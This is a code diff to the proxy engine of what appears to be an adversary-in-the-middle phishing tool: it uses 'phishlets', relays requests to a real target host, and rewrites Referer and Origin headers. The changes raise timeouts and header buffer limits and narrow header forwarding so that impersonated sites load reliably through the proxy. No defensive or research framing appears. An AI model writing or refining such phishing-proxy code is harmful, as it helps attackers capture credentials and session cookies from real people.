@@ -113,12 +113,16 @@ class ProxyEngine:
         self._client_session = ClientSession(
             connector=connector,
             cookie_jar=CookieJar(unsafe=True),
-            timeout=aiohttp.ClientTimeout(total=30),
+            timeout=aiohttp.ClientTimeout(total=60),
             headers={
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                 'Accept-Language': 'en-US,en;q=0.5',
                 'Accept-Encoding': 'identity',  # No compression for easier rewriting
-            }
+            },
+            # Increase limits for sites with large headers/cookies
+            read_bufsize=2**18,  # 256KB buffer
+            max_line_size=32768,  # 32KB max line size
+            max_field_size=32768,  # 32KB max header field size
         )
         logger.info("Proxy engine initialized")
 
@@ -285,11 +289,13 @@ class ProxyEngine:
         if request.query_string:
             target_url += f"?{request.query_string}"
 
-        # Forward request
-        headers = {'Host': domain}
-        for key, value in request.headers.items():
-            if key.lower() not in {'host', 'connection', 'transfer-encoding'}:
-                headers[key] = value
+        # Forward only essential headers
+        headers = {
+            'Host': domain,
+            'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0'),
+            'Accept': request.headers.get('Accept', '*/*'),
+            'Accept-Language': request.headers.get('Accept-Language', 'en-US,en;q=0.5'),
+        }
 
         try:
             async with self._client_session.request(
@@ -351,18 +357,19 @@ class ProxyEngine:
         if request.query_string:
             target_url += f"?{request.query_string}"
 
-        # Prepare headers
+        # Prepare headers - only forward essential ones to avoid header size issues
         headers = {
             'Host': phishlet.target_host,
-            'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0'),
-            'Accept': request.headers.get('Accept', '*/*'),
+            'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'),
+            'Accept': request.headers.get('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
             'Accept-Language': request.headers.get('Accept-Language', 'en-US,en;q=0.5'),
         }
 
-        # Copy other headers
-        skip_headers = {'host', 'connection', 'transfer-encoding', 'content-length', 'accept-encoding'}
+        # Only copy specific safe headers to avoid size issues
+        safe_headers = {'content-type', 'referer', 'origin', 'x-requested-with', 'sec-fetch-dest',
+                        'sec-fetch-mode', 'sec-fetch-site', 'cache-control', 'pragma'}
         for key, value in request.headers.items():
-            if key.lower() not in skip_headers:
+            if key.lower() in safe_headers:
                 # Rewrite referer/origin
                 if key.lower() in ('referer', 'origin'):
                     value = self._rewrite_url_reverse(value, phishlet)
